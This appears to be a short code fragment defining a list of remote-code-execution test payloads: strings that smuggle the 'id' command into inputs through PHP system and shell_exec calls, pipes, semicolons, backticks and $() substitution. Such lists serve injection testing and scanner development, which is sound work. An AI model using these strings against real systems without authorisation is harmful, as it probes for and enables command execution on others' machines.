RCE_PAYLOADS = [
    "'; system('id'); --",
    "'; echo shell_exec('id'); --",
    "| id",
    "; id",
    "`id`",
    "$(id)"
]
